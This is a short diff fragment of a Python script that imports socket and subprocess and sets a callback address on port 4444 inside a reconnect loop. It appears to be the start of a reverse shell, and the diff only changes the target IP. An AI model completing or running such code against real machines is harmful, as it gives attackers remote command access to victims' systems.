@@ -1,7 +1,7 @@
 import socket
 import subprocess
 
-k = ("10.0.0.131",4444)
+k = ("10.0.0.0",4444)
 
 while True:
     p = socket.socket()
